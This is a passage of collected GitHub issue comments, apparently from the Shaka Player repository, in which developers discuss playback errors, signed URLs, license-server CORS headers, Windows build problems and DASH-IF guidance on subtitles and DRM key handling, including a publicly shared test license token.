    "renholm": "@joeyparrish Thanks, it helps! I posted here if someone else have been noticing the problem. We will investigate further.\n. Here are the logs, it simply says that it was a decoder error. Can we get more information somehow?\n00:00:00 00 pipeline_state  kCreated\n00:00:00 00 event   WEBMEDIAPLAYER_CREATED\n00:00:00 00 url blob:https://cf.znipe.tv/942649b1-7f4c-43a8-afa1-3dcb2ed99f21\n00:00:00 00 pipeline_state  kInitDemuxer\n00:00:00 46 duration    2631678.575999\n00:00:00 834    info    Audio codec: mp4a.40.2. Sampling frequency: 44100Hz. Sampling frequency(Extension): 0Hz. Channel layout: 3.\n00:00:00 834    found_audio_stream  true\n00:00:00 834    audio_codec_name    aac\n00:00:00 834    info    Video codec: avc1.4D401F\n00:00:00 834    found_video_stream  true\n00:00:00 834    video_codec_name    h264\n00:00:00 840    pipeline_state  kInitRenderer\n00:00:00 840    audio_dds   false\n00:00:00 840    audio_decoder   FFmpegAudioDecoder\n00:00:00 847    video_dds   false\n00:00:00 847    video_decoder   GpuVideoDecoder\n00:00:00 847    pipeline_state  kPlaying\n00:00:00 847    pipeline_state  kSeeking\n00:00:04 827    pipeline_state  kPlaying\n00:00:04 869    pipeline_state  kSeeking\n00:00:05 823    pipeline_state  kPlaying\n00:00:05 835    pipeline_state  kSeeking\n00:00:08 97 pipeline_state  kPlaying\n00:00:08 105    pipeline_state  kSeeking\n00:00:11 826    pipeline_state  kPlaying\n00:00:11 845    pipeline_state  kSeeking\n00:00:15 111    pipeline_state  kPlaying\n00:00:15 113    pipeline_state  kSeeking\n00:00:15 124    pipeline_state  kPlaying\n00:00:15 237    event   PLAY\n00:00:17 826    pipeline_state  kSeeking\n00:00:17 830    pipeline_state  kPlaying\n00:00:17 859    pipeline_state  kSeeking\n00:00:17 925    pipeline_state  kPlaying\n00:00:17 930    error   video decode error\n00:00:17 932    pipeline_state  kStopping\n00:00:17 932    pipeline_state  kStopped\n00:00:17 932    pipeline_error  pipeline: decode error\n00:00:17 932    event   PAUSE\n00:00:17 939    event   WEBMEDIAPLAYER_DESTROYED\n. @joeyparrish I've submitted the bug to Chromium, thanks for pointing us in the right direction.\n. ",
    "ajbeach2": "Thanks I will look into that.  The signed URL parameter generation is asynchronous though. Our API server contains our AWS credentials that sign the stream url's so that they expire, I think we need to generate those when the manifest is parsed. \n. In my use case, lets say, that the .mpd file has a base url that is something like http://mybucket.s3.amazonaws.com/files/movie.mp4. The signed url would be something like: http://mybucket.s3.amazonaws.com/files/movie.mp4?Signature=123123123123123.  The license server in this case is really our API sever that returns that second url, which the player would need to use to get the stream.\nIn the tutorial, you have this for parameter authentication, which I am not sure fits the above use case. Is there a request type for the media files?\nvar manifestUri = '//storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd';\nvar licenseServer = '//cwip-shaka-proxy.appspot.com/param_auth';\n  player.getNetworkingEngine().registerRequestFilter(function(type, request) {\n    // Only add headers to license requests:\n    if (type == shaka.net.NetworkingEngine.RequestType.LICENSE) {\n      // This is the specific parameter name and value the server wants:\n      request.uris[0] += '?CWIP-Auth-Param=VGhpc0lzQVRlc3QK';\n    }\n  });\n. I would have to see how exactly amazon signs the URLs but I believe the hash function that generates the Signature URL parameter includes the domain for each asset. So the signature parameter would be different for every url in the manifest. \nThe signatures are created server side, so I suppose it could just be an additional json blog returned with the path to the mpd file when that video is request. This means however, the mpd needs to be parsed both client side and server side, which is less than ideal. But yeah I could modify the networkengine to async get a signature for every baseurl.\n. I am going to close this because I have the information that I need.\n. Ok, that works, however, it seems as though, when changing to a new resolution, there is still buffered frames for the old. If i change the track using select track, then do $(video).currentTime = 60 (which this jump is outside of the current segment range) \nhttps://jsfiddle.net/yh95LL4o/7/\nThe player is playing in the lowest framerate, event though in my player setup callback, the 1080p track is selected. When you jump to 60 seconds, outside the current buffer, then the 1080p is playing.\nIs there a way to reset this buffer to change to the new stream immediately? \n. Figured it out. shaka.Player.prototype.selectTrack = function(track, opt_clearBuffer). Passing true for opt_clearBuffer fixed my issues.\n. I am going to close this, as the  v2.0.0-beta3 works as expected for me.\n. You should be able to do this with webpack. Its probably a case of using the expose-loader\nhttps://webpack.github.io/docs/shimming-modules.html\n. I haven't been able to test it but, i believe this is how you would do this:\nnpm install script-loader\nrequire('script!shaka-player/third_party/closure/goog/base.js');\nrequire('script!shaka-player/dist/deps.js'')\nrequire('script!shaka-player/shaka-player.uncompiled.js')\n. Actually, I am not sure this makes sense anymore.  AWS recommends using signed cookies instead of signed urls when distributing content from cloudfront.  In this case, the shaka player would need to be able to support cookie authentication for the manifest, and segment urls.  All of the urls would remain unchanged, and you wouldn't need to add any sort of filtering to the manifest or change how the manifest is parsed.\nThe other thing is that a manifest could be dynamically created before being passed to the shaka player client. In other words, your API that is doing the signing could parse the manifest, replace the base urls with signed urls, and serve that to the client.\nSeeing how implementations of signatures will vary, I am not sure that this approach in the mailing list makes sense. I don't think it needs to be the responsibility of the client to handle signed urls when you can just create and serve a manifest with signed base urls which will just work with the shaka player as it is.\n. Yeah I would say close it\n. I am guessing my build of chromium doesn't support mp4/mp3. I would need to rebuild it with support for those codecs. If the above is the expected behavior when mp4 codecs are not supported I can just close this issue.\n. ",
    "esboyd": "Thanks for checking in on this @joeyparrish. I am reaching back to the customer to see if they were able to change anything\n. @joeyparrish they added  \n\"headers\": [{\"name\": \"Accept\", value\": \"*/*\"  },\nBut the response header is still not containing the following: \n\"headers\": [\n                        {\n                            \"name\": \"Access-Control-Allow-Headers\",\n                            \"value\": \"ORIGIN, X-REQUESTED-WITH, CONTENT-TYPE, ACCEPT, SOAPACTION, CUSTOMDATA, AUTHORIZATION\"\n                        },\n                        {\n                            \"name\": \"Access-Control-Allow-Methods\",\n                            \"value\": \"GET, POST, OPTIONS, HEAD\"\n                        },\n                        {\n                            \"name\": \"Access-Control-Allow-Origin\",\n                            \"value\": \"http://playready.azurewebsites.net\"\n                        },\nWhich is what we see happens in one of the other test players. Reaching out to the owner of the license server to see why those headers are not getting added to the response. \nthanks again!\n. @joeyparrish Sorry for the late reply, still have not been able to get the key server to change their rules, so we can probably close this.\n. ",
    "olivbraun": "We have the same issue, and as for now the only workaround we found was to use Flash on Firefox...\n. I tested both FF 47.0.1 and Nightly, and noticed that Widevine CDM is reinstalled whenever I switch from one version to the other.\nWhen I start the browser and immediately go to the Plugins menu, it says that Widevine CDM will be installed shortly, which is the true after 30s to 1min.\nIf I wait until the plugin is installed and then run the script above, it works fine and tells me \"Created cdm\". If I don't wait and run the script while the plugin is not yet installed, I get a message saying that Firefox is currently installing a required component, but then when I refresh the page a few seconds later it works fine.\nI'm not able to reproduce the problem I previously had (the script returning a blank page). I wonder if the fact that the CDM was reinstalled when I switched between 47 and Nightly versions helped.\n. ",
    "op1ekun": "Well, your Fiddle works just fine for me. The video switches to the highest bitrate around 36th second.\nIf you want to react to subtle bitrate changes you should probably listen to the \"bandwidth\" event, and than change the tracks on your own.\n. ",
    "mseeley": "Hi @TheModMaker. It sounds like it could; thanks a lot for the ping. :)\nPlease feel free to close this. I'll open an issue with updated context if we have trouble.\nThanks!. HI @vaage good question. I've just confirmed; the player is skipping the first 10s of content.. @vaage, #1625 mentions a fix in 2.50 beta. I can confirm this is fixed in the 2.5.0-beta2 npm package without any of the configuration mentioned above. Diff: https://gist.github.com/mseeley/908f51ac71e33d08797857d742b34296.. Thank you @vaage and @joeyparrish! Zero worries here. \ud83d\ude04 . Hi @joeyparrish \ud83d\udc4b. I've been sleuthing in this repo to find a general 2.4.7 release plan/timing although I haven't found information. Will you please share some general thoughts on 2.4.7? No pushy request to release, just a request for a bit of context I can use to update state on our internal issue tracker. Thanks!. ",
    "jjs1233": "It not happen very often\nOften there will be a third was a failure\n. shaka.util.Error\n  category:1\n  code:1002\n  data:Array[1]\n    0:\"http://localhost/videolib/standard.mp4\"\n  message:\"Shaka Error NETWORK.HTTP_ERROR (http://localhost/videolib/standard.mp4)\"\n  stack:\"Error: Shaka Error NETWORK.HTTP_ERROR (http://localhost/videolib/standard.mp4)\n    at new shaka.util.Error (http://localhost/assets/shaka-player/lib/util/error.js:78:13)\n    at XMLHttpRequest.xhr.onerror (http://localhost/assets/shaka-player/lib/net/http_plugin.js:78:14)\"\nshakaDemo.onError_  @   main.js:143\nIs this the error code you want it?\nBut the resource is exist\nif I open the link in brower it worked\n\nthere is my javascript code to trigger the shakaplayer\naddLoadEvent(function() {\n    shakaDemo.load(\"a.mpd\");\n });\nFinally forgive my broken English and Thanks for your help\n. In addition to say if the code used in the console of browser it worked never make mistake\nBuy if I use the ajax `\nvar aj = $.ajax({\n            url:'/delete_vtt',\n            beforeSend: function(xhr) {xhr.setRequestHeader('X-CSRF-Token', $('meta[name=\"csrf-token\"]').attr('content'))},\n            data:{\n                start:start,\n                end:end\n            },\n            // async: false,\n            type:'post',\n            cache:false,\n            dataType:'script',\n            succes:function(){\n            },\n            error:function(){\n            }\n        });\n`\nthe ajax return value is the rails format.js\n`\n<% if @symbol.nil? %>\nalert('wrong!');\n<% else %>\nshakaDemo.load(\"/videolib/three/a/a.mpd\");\n<% end %>\n`\nThe error usually occurred \n. - What version of Shaka Player are you using?\nthe version is 2.0\n- Are you using the demo app or your own custom app?\nthis is my own custom app \nI want to achieve the function of online editing subtitles file\n- What did you do?\nwhen the video is playing send send a Ajax request the return is script \nwhich is shakaDemo.load(\"/videolib/three/a/a.mpd\"); //just reload the video address\n- What did you expect to happen?\nthe video load success\n- What actually happened?\nthis is the error code\nplayer.js:1635\nAssertion failed: Wrong error type!\nshaka.Player.onError_ @ player.js:1635\nshaka.media.StreamingEngine.onUpdate_ @ streaming_engine.js:726\nmain.js:148\ntext_engine.js:264 Uncaught TypeError: Cannot read property 'length' of null(\u2026)\nPlayer error DOMException: Failed to read the 'buffered' property from 'SourceBuffer': This SourceBuffer has been removed from the parent media source.(\u2026)\nshakaDemo.onError_ @ main.js:148\nshakaDemo.onErrorEvent_ @ main.js:134\nshaka.util.FakeEventTarget.dispatchEvent @ fake_event_target.js:109\nshaka.Player.onError_ @ player.js:1638\nshaka.media.StreamingEngine.onUpdate_ @ streaming_engine.js:726\n. I hava solve the problem by my friend\nbut thanks for you help\n. ",
    "atanaschristov": "Thanks for your answer @joeyparrish \nIt seems that the issue exists in v1.6.5\nI have deep dived in it and found out the following:\n1. the manifest is loaded and parsed regularly, So I could trace that the shaka receives and is aware of the new timeShiftBufferDepth values\n2. it seems that although the mpd in general seems to get updated, the mpd instance in LiveSegmentIndex where the seek range is calculated(getSeekRangeInternal) is not updated. It always contains the initial timeShiftBufferDepth\nI suspect(not sure though) that in v2.0.0-beta issue #295 would fix the issue of LiveSegmentIndex to use the latest updated mpd object. Am I correct? \nSo is v2.0.0-beta3 considered stable and if not when is expected to have v2.0.0 stable version\nAgain thanks a lot for your help\nUpdate:\nIt seems in v2.0.0-beta3 the seekRange changes according to timeShiftBufferDepth. So the issue seems to be fixed. \n. We've decided to go with shaka v2.0.0. If I have time I may try to create a PR for v1.6.x.\nThanks a lot and keep up the good work. Cheers.\n. ",
    "MachalovaZuzana": "Nowadays, in our company, we are discussing the similar issue. I must agree with Tomas. Based on my own experience with customers and their end-users, it would be better solution to ignore unavailable external subtitles and allow to play video. In case, that the first experience of end-user with playing the content will be so bad, the end-user will never return back.\n. ",
    "JLHasson": "@joeyparrish Is the suggested method above (editing manifest with pre-signed urls) the best way to achieve this at this time? I am attempting to load content from an S3 bucket that is not public, and believe I am running into a similar problem as discussed on the mailing list link above. I am pre-signing the link to the manifest, and feeding that into shaka-player, however when it attempts to load each segment it does not have access as the base urls from the manifest have not been pre-signed. . Hey, sorry taking so long to get back to you. I think this could possibly work, but I need to dig into it more. Will be back if it doesn't! Thanks for the help! \ud83d\ude04 . ",
    "osmestad": "Thank you for your swift reply! \nWas fearing there wouldn't be a simple solution, otherwise I guess it would have been done by now.\nHad a look, for WebKit I am guessing it is this ticket:\nhttps://bugs.webkit.org/show_bug.cgi?id=158843 (part of: https://bugs.webkit.org/show_bug.cgi?id=158836 )\nFor Edge/IE I could not find an issue so I created this one:\nhttps://developer.microsoft.com/en-us/microsoft-edge/platform/issues/8427961/\nWorth trying to push the web forward :) \n. I think this would be very interesting for our use case (I work on music streaming at TIDAL) currently we use two instances of Shaka player to do preloading of the next track when the playing track is close to finished. Ideally we would like to have as short a gap when switching between tracks as possible (gapless being the goal) :-). This does not seem to be working currently?\nTesting https://shaka-player-demo.appspot.com/demo/ with Chrome 63 (macOS 10.13.2) the Bitmovin Art of Motion (HLS, TS) and Sintel (HLS, TS, 4k) are not selectable.\nUpdate: If I manually remove the \"disabled\" attribute from the examples dropdown they will play, so I guess the problem is in how the detection for shakaAssets.Feature.MP2TS support is happening. \nI see this has been reported as:  #1214. ",
    "sandersaares": "I note that DASH-IF IOP v3.3, section 6.4.5 forbids the use of plaintext TTML/WebVTT text in multiple segments, as quoted below.\n\nOnly one file for the full period is permitted, practically limiting this use case to non-live content.\nSuch external files are assumed do have a timeline aligned with the Period, so that TTML time 00:00:00.000 corresponds to the start of the Period. [...]\nThe same applies to side-loaded WebVTT files. In that case, the @mimeType is text/vtt. If segmented subtitles are needed, such as for live sources, ISOBMFF-packaged TTML or WebVTT segments are expected be used to provide proper timing.\n\nTherefore the use of such content is dubious at best. You should be using ISOBMFF encapsulation for text streams.\n. Specification-wise, media samples that exist in ISOBMFF containers exist on a separate timeline from the period, with presentationTimeOffset being the alignment factor. In other words, the period 00:00:00 is mapped to 179683200 seconds in the media sample timeline. So to display a piece of text at the start of the period, it would need to have the timestamp of 179683200 seconds, which is 49912:00:00.\nHowever, media samples that exist in plain text (sidecar) files are assumed to have a timeline aligned with the period (see DASH-IF IOP 6.4.5)!\n. Is the meaning/format/structure of this ms:laurl documented/specified anywhere? Or is it just a random attribute Azure adds? There has been some talk in DASH-IF of unifying this aspect of metadata (license server URL) but it never got anywhere, so I am curious if there is an unofficial trend forming in some corner of the industry.\n. > My inclination is for player config to take precedence, so you can override bad content, but I could be wrong.\nI agree with this interpretation - anything coming from the mpd should be the default value, to be overridden by the app controlling the player if it decides to.\nThis comment is not intended as a signal of interest in seeing this feature implemented, though. In practice, I have never encountered a situation where the player cannot simply be told what license server to use. The less \"operational\" info in the manifest the better IMO.. I confirm modifying these lines to explicitly reference Python 2 does help the build process move forward. As I believe there is no standard way to choose which version of Python to run (they all come as python.exe by default), I imagine the best fix would be to always run the same Python executable that is always running, e.g. from sys.executable.\nHowever, now it fails with the following output:\nGenerating Closure dependencies...\nRunning Closure linter...\n162 files checked, no errors found.\nRunning htmlhint...\nTraceback (most recent call last):\n  File \".\\build\\all.py\", line 42, in <module>\n    shakaBuildHelpers.run_main(main)\n  File \"C:\\Source\\shaka-player\\build\\shakaBuildHelpers.py\", line 207, in run_main\n    sys.exit(main(sys.argv[1:]))\n  File \".\\build\\all.py\", line 30, in main\n    code = check.main([])\n  File \"C:\\Source\\shaka-player\\build\\check.py\", line 157, in main\n    elif not check_html_lint():\n  File \"C:\\Source\\shaka-player\\build\\check.py\", line 80, in check_html_lint\n    return subprocess.call(cmd_line) == 0\n  File \"c:\\Python27\\lib\\subprocess.py\", line 523, in call\n    return Popen(*popenargs, **kwargs).wait()\n  File \"c:\\Python27\\lib\\subprocess.py\", line 711, in __init__\n    errread, errwrite)\n  File \"c:\\Python27\\lib\\subprocess.py\", line 959, in _execute_child\n    startupinfo)\nWindowsError: [Error 193] %1 is not a valid Win32 application\nI also tried upgrading my Python 2 but this changed nothing. New version is: Python 2.7.12 (v2.7.12:d33e0cf91556, Jun 27 2016, 15:24:40) [MSC v.1500 64 bit (AMD64)] on win32\nExploring what the script does, it appears to be executing c:\\Source\\shaka-player\\node_modules\\.bin\\htmlhint c:\\Source\\shaka-player\\index.html c:\\Source\\shaka-player\\demo/index.html c:\\Source\\shaka-player\\support.html. Of course, this Linux shell script will not work on my Windows installation.\nIs Windows supported as a development platform?\n. See https://github.com/google/shaka-player/issues/512\nSeems to be a popular request! Not possible, as far as I know, though. Note that browsers implementing PlayReady DRM (Edge and IE11) do support persistent licenses.\n. Aha, that's interesting. I did not realize Edge and IE11 persistence was something different! Thanks for clarifying.\n. I am curious about the use case - can you explain more? Do I understand it right that the license server you are working with requires the key ID to be supplied as a custom extension to the license request, in addition to the key ID that already exists in the DRM system domain (inside the DRM-technology-specific part of the license request)? If so, how is this data used - is it simply passed to the license server as-is?\n. The multi-key issue is that there exists at least one player (ExoPlayer) that assumes requesting one key for a presentation (for one adaptation set) will cause the DRM system to make the keys for all encrypted adaptation sets available.  This I believe is contrary to DASH-IF IOP, though it is rather implicitly stated by IOP at the moment and could certainly be spelled out more clearly. At the moment, I am in the process of proposing a change to IOP clarifying this aspect.\nThe workflow I envision on this topic would be that:\n1. The player determines what keys it needs (via default_KID plus querying the CDM for already available keys, if such query function is supported).\n2. The player requests the DRM system (CDM) to get all the keys the player needs but that are not available.\n3. The DRM system makes one or more license requests to get these keys (ideally, batching all the key requests up all up into one license request).\n4. The DRM system processes the license response(s) and notifies the player of the results (all keys need not become available, due to authorization decisions on the server side).\nI believe present-day CDMs do not really implement features to batch up license requests, which is why there has been some desire in some places to do this \"behind the scenes\" key retrieval where requesting one key will actually return many of them (based on some content ID or whatnot in the PSSH). This, however, is not really interoperable and should be discouraged.\nI have not had a chance to take a look at Shaka Player behavior in this regard - what interpretation does it conform to?\n. What I meant with regard to ExoPlayer is that it appears to only ever make a single license request, even if multiple keys (as identified by default_KID and the appropriate Initialization Data) are needed to play the selected adaptation sets. It assumes that the license server will somehow know all the keys needed to play all the other adaptation sets, as well, and return them as a set, based on only this single request for a single key.\nWhile it is possible to implement a license server that does this (e.g. by embedding a content ID in the PSSH), it is not really an interoperable way to use DASH. The player should ask the CDM to acquire every default_KID from the selected adaptation sets.\nThe batching up aspect I mentioned is more to do with the requests, not so much the responses - if the player sees that there are two adaptation sets, one with default_KID \"X\" and another with default_KID \"Y\", it knows that two content keys are needed. The player then informs the CDM that it wants to use these keys and requests that the CDM go get them, if needed.\nHowever, there is not really anything in EME that allows one to provide the CDM two sets of Initialization Data at once - as soon as you provide Initialization Data for key X, the CDM will make a license request. Ideally, you would batch up the requests for both key X and key Y into a single license request (for optimization of network traffic and/or control flow in the player). In theory, one might concatenate the PSSH boxes and expect the CDM to understand what is happening but that sort of behavior is not guaranteed by EME, so may not be practical, especially across DRM systems. Hopefully a future version of EME can cover this gap in a standardized way. Considering how many HTTP requests video playback already makes, I think it is not a big deal to request each key individually, but it matters for some, so an optimization here probably should be enabled, hence my talk of batching.\nFrom your description, it sounds like the Shaka Player works in an interoperable way with regard to multi-key content.\nThe triggering of license requests based on initialization data is perhaps a point of interest, though. The relationship of Initialization Data and EME appears to be still evolving, though based on today's situation I would probably take the view that it is best treated as an opaque blob to be handed over, not triggering any logic by its presence or content (with the default_KID being the trigger for the player's DRM behavior). Reading meaning into PSSHs seems dangerous. Do you have a particular reason for basing the logic on the Initialization Data difference?\nI remember a case with dash.js, which also uses the same (Initialization Data based) logic, where this became a problem. For whatever reason, the content workflow created different PSSHs for the same content key in different places (manifest VS init segment, I believe?), which led to two license requests. One of those was rejected by the license server (it only expected one), leading to playback failure, despite actually getting a license in the other request. The content of the PSSHs is entirely in the DRM domain, so one cannot really say that such content is wrong in any way. Probably better error handling logic in the player could have survived this situation gracefully, by using the license that was provided in the other response. Yet, considering the big picture, it should be possible for people to make players without thinking deeply about such edge cases, if they follow interoperable specifications. If dash.js had based its logic on default_KID, it would have survived this issue.\n. I would like to point out some additional complexity, especially with live streams. Empty periods and dummy content might be technically feasible for on-demand content but for live content, the backend often might not even have the ability to detect missing pieces, let alone do something about them. Many packagers simply deliver segments over FTP to a CDN origin and if one segment gets lost then too bad - it will just skip the segment and carry on.\nThis should not happen but real world network conditions can be nonideal, so I have seen it quite a lot in practice - there's a gap of one or more segments, after which the stream continues just fine. Maybe not very often but perhaps just once a day. If players do not skip past 404s, this means that live streams will suddenly stall at random moments in time, for all (or a large subset of) users simultaneously. This makes users rather unhappy.\n. This topic is currently also under discussion/development in the dash.js player. Perhaps some collaboration might be beneficial. I link here the dash.js discussion on the topic.\nhttps://github.com/Dash-Industry-Forum/dash.js/issues/651\n. > Combine those manifests into one using multiple DASH Periods to stitch them together. Shaka should play this seamlessly.\nI know that dash.js rebuilds the media pipeline between periods, as it was found that it is not really possibly to know whether the sample stream in one period is directly compatible to the next. This causes a visible pause/glitch in playback. Are you saying that Shaka Player is able to do gapless multi-period playback? I am curious how you solved the problem of the codec parameters being different between periods, on a level that may not be obvious from the manifest.\n. I have also noticed some sluggishness of the demo site from time to time, though it is fine at the moment for me. Will try compiled mode when it happens again.\n. From IOP viewpoint, text should be in ISOBMFF in order to achieve interoperable playback. This also eliminates the need to care about period timeline.\nQuoting IOP section 6.4.2:\n\nThis specification does not specify interoperable playback of these \u201csidecar\u201d subtitle files in combination with a DASH audio visual presentation.. Well, that gets somewhat into philosophical areas. Should DASH-IF care about interoperability even when people use obsolete/nonrecommended mechanisms? If yes, implementations will be more unified but it might also lend some unwanted credibility to the approach in question. If no, it is likely that implementations will diverge and people will be unhappy with DASH as a technology.\n\nBoth approaches have upsides and downsides. The former has been selected as the favored one in this instance. I think, on balance, it is the better of the two.. I consider it unlikely but you can certainly file an issue on the IOP tracker and try to convince people to change it: https://github.com/Dash-Industry-Forum/DASH-IF-IOP/issues. {\n  \"type\": \"geo\"\n}\nThis is all those URLs give me.. Oh, I did not realize the PlayReady license configuration was missing from the original test vectors. Sorry about that! I will make a note to replace the tokens in the Axinom test vector repository with proper ones that include the license configuration.\nMeanwhile, here is a temporary license token for Axinom DRM that should authorize all the v7 test vector keys and include the necessary PlayReady license policies to allow playback on a VM for your testing purposes.\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtZXNzYWdlIjp7InBsYXlyZWFkeSI6eyJtaW5fYXBwX3NlY3VyaXR5X2xldmVsIjoxNTAsInBsYXlfZW5hYmxlcnMiOlsiNzg2NjI3RDgtQzJBNi00NEJFLThGODgtMDhBRTI1NUIwMUE3Il19LCJrZXlzIjpbeyJlbmNyeXB0ZWRfa2V5IjoibEszT2pITFlXMjRjcjJrdFI3NGZudz09IiwiaWQiOiI5ZWI0MDUwZC1lNDRiLTQ4MDItOTMyZS0yN2Q3NTA4M2UyNjYifSx7ImVuY3J5cHRlZF9rZXkiOiJsaU5KcVZhWWtOaCtNS2N4SkZrN0lnPT0iLCJpZCI6IjgwMzk5YmY1LThhMjEtNDAxNC04MDUzLWUyN2U3NDhlOThjMCJ9LHsiZW5jcnlwdGVkX2tleSI6ImtZdEhIdnJyZkNNZVZkSjZMa2Jrbmc9PSIsImlkIjoiOTA5NTNlMDktNmNiMi00OWEzLWEyNjAtN2E1ZmVmZWFkNDk5In0seyJlbmNyeXB0ZWRfa2V5IjoiN3c3TlpISExNZ0o0bVFLRUs1TFRNUT09IiwiaWQiOiIwZTRkYTkyYi1kMGU4LTRhNjYtOGMzZi1jMjVhOTdlYjY1MzIifSx7ImVuY3J5cHRlZF9rZXkiOiJBYzRVVW1ZdEJKNW5QUTlOMTVyYzNnPT0iLCJpZCI6IjU4NWYyMzNmLTMwNzItNDZmMS05ZmE0LTZkYzIyYzY2YTAxNCJ9LHsiZW5jcnlwdGVkX2tleSI6Ik82Rk8wZnFTV29wcDdiamMvRDRsTUE9PSIsImlkIjoiNDIyMmJkNzgtYmM0NS00MWJmLWI2M2UtNmY4MTRkYzM5MWRmIn0seyJlbmNyeXB0ZWRfa2V5IjoiUHc2K2VFWU5jdmpZYmZzaDNYM2ZtZz09IiwiaWQiOiIwODcyNzg2ZS1mOWU3LTQ2NWYtYTNhMi00ZTViMGVmOGZhNDUifSx7ImVuY3J5cHRlZF9rZXkiOiIvMStmTmloMzhtcVJ2NHljWXpudC93PT0iLCJpZCI6ImMxNGYwNzA5LWYyYjktNDQyNy05MTZiLTYxYjUyNTg2NTA2YSJ9LHsiZW5jcnlwdGVkX2tleSI6ImtxMEp1WkVqcEZOOHNhVG10NTYwT2c9PSIsImlkIjoiOGIwMjllNTEtZDU2YS00NGJkLTkxMGYtZDRiNWZkOTBmYmEyIn0seyJlbmNyeXB0ZWRfa2V5IjoiVGNSUWVCV3hFb0hPS0hyYWQ0U2VWUT09IiwiaWQiOiIyZDZlOTM4Ny02MGNhLTQxNDUtYWVjMi1jNDA4MzdiNGIwMjYifSx7ImVuY3J5cHRlZF9rZXkiOiJwb2VuY1M3R2dtZUdGZW9KNlBFQVRRPT0iLCJpZCI6ImRlMDJmMDdmLWEwOTgtNGVlMC1iNTU2LTkwN2MwZDE3ZmJiYyJ9LHsiZW5jcnlwdGVkX2tleSI6ImVpSS9Nc2xsclE0d0NsUlQvTE5tQ0E9PSIsImlkIjoiOTE0ZTY5ZjQtMGFiMy00NTM0LTllOWYtOTg1MzYxNWUyNmY2In0seyJlbmNyeXB0ZWRfa2V5IjoiMncremR2cXJwRFYzeFIwYkp5NHVndz09IiwiaWQiOiJkYTQ0NDVjMi1kYjVlLTQ4ZWYtYjA5Ni0zZWYzNDdiMTZjN2YifSx7ImVuY3J5cHRlZF9rZXkiOiIveGxTSHB4d3F1M2dvL2dscG1TZ2FRPT0iLCJpZCI6IjI5ZjA1ZThmLWExYWUtNDZlNC04MGU5LTIyZGNkNDRjZDdhMSJ9LHsiZW5jcnlwdGVkX2tleSI6Inp1Nml1ek4ycHNpMFpTeFFpQVRrUlE9PSIsImlkIjoiNjlmZTcwNzctZGFkZC00YjU1LTk2Y2QtYzNlZGIzOTkxODUzIn1dLCJ0eXBlIjoiZW50aXRsZW1lbnRfbWVzc2FnZSJ9LCJjb21fa2V5X2lkIjoiYjMzNjRlYjUtNTFmNi00YWUzLThjOTgtMzNjZWQ1ZTMxYzc4IiwidmVyc2lvbiI6MX0.IEKKWIHFROEWaOvmFu16NIZoOq6pEf42s-_Y9bwTqoQ\nI also confirm that I can reproduce this issue on  Microsoft Edge 40.15063.674.0; Microsoft EdgeHTML 15.15063.. Just to confirm, I also get 80070241 on Edge 41 (Windows 10 v1709) with Axinom content. Will ask the Axinom DRM team to check it out and report back on the findings. My previous test was with Windows 10 v1703 and Edge 40, so perhaps something changed there.\n\nAxinom tests wouldn't play on a VM\n\nIf you replace the token in the playlist with the one I pasted above in a previous comment it should work.\nI was able to easily reproduce this issue using Fiddler as a proxy - it has a \"Simulate Modem Speeds\" setting that nicely drags network performance down to a level where a suitable delay occurred every time.. I heard back from Axinom DRM team: on Windows 10 1709, neither the 80070241 nor the 8004b896 reproduces for them. I guess the 80070241 we get remains a mystery for now.. Nice report - good reading! However, I find the pie chart colors very confusing due to no association with the \"weight\" of the values and thus the pie charts are very difficult to parse.. I would expect the colors to be on some scale, like \"blue...red\" for less/more important ends of the scale. Right now they are just arbitrary colors, so there is no mental mapping from \"there is much green here\" to \"a lot of people consider it important\" (or was it blue for very important? I forget already - illustrating the problem). DASH-IF IOP states that a change in content key requires a new period to be created, enabling you to provide any new initialization data in the MPD. I believe the current interpretation is smeared across different points but there is a change enqueued for vNext to be even more explicit about this.\nOne exception is when hierarchical keys are used - the leaf keys may be changed within a period, although a new root key will still require a new period to be created. Presumably, for leaf key rotation there would be PSSHs in the media segments which the CDM would use for obtaining the input data for leaf key rotation. This must all be invisble to the player (the DASH layer just deals with the root keys in hierarchical key scenarios and any activity with leaf keys is purely in the domain of the CDM).\nAs implementations of hierarchical keys are sparse and the relevant sections in IOP have not had as many eyes on them as the others, the wording in IOP with regard to them could probably benefit from clarification. I believe EME interactions in a hierarchical key scenario are also not well explored (naively, I would expect each PSSH in a media segment to raise encrypted and the player to thereby feed this PSSH to generateRequest() and for this all to not result in any license request but just the CDM internally rotating the leaf key).\nIs the context here regular key rotation or leaf key rotation in a hierarchical key scenario?. The option of providing future keys described by DASH-IF IOP does not eliminate the need to signal those future key changes in the way documented in IOP. It is an additional feature on top of the regular DRM interactions, to help players retrieve keys in advance, and does not replace the more basic use cases nor remove the need for any signaling that would otherwise be present.\n\nif the license server has the logic to know what keys to return regardless of the PSSH info, etc.\n\nAll required content keys (root keys in case of hierarchical keys) must be signaled in the manifest for the content to conform to DASH-IF IOP. If there is some hidden logic that drives the license server to send some keys that were not signaled in the manifest then that is not an ineroperable scenario. See IOP 4.1 section 7.7.9, where the basic expectations are outlined (basically, the default_KID is the focus of all key management interactions on the DASH layer).\nI agree with your statement that PSSHs in the media segments ought to be passed to EME but this is would be to serve hierarchical key scenarios, not as a replacement for regular key rotation signaling (at least as far as compatibility with DASH-IF IOP is desired). I imagine there are also browser compatibility concerns there (hierarchical keys are not (yet?) used much in practice, so it is likely an area with plenty of unresolved issues). After all, I assume there are good reasons this is not done currently (or at least, is done with some filtering logic).\nTo emphasize the keyid-period relationship, I would also direct you to IOP 4.1 7.7.6 which says:\n\nIf a new license is needed and cenc:default_KID is to be changed, it SHALL be at the beginning of a Period. Yes, I would say those three points accurately describe my interpretation of IOP guidelines.\n\nSimilar questions used to come up in DASH-IF context more often a few years back when there were not many companies implementing IOP. This has changed and IOP tends to be quite popular these days, as it has become obvious that following IOP helps keep development costs down. I have noticed a decrease in the amount of such DRM related questions, so presumably this means that there is something of a common understanding in place by now.\nAs with any voluntary guidelines, it always depends on how much product authors care about IOP. Certainly, DASH allows all sorts of mechanisms that are outside the scope of things allowed by IOP. This is pretty much the reason IOP was created - to create some common interpretation of a reasonable feature set that can serve common needs in a generic way.. As I understand it, option 1 above refers to the situation where the samples are signaled as encrypted with key Y whereas the manifest (default_KID) and init segment (tenc box) signal key X.\nIn this scenario, I see an IOP violation in the aspect that the CDM is only informed to acquire key X and it it is never informed about the need to acquire key Y (until it encounters samples encrypted that key Y). This seems contrary to 7.7.9 and 7.7.6 of IOP which tie the acquisition of 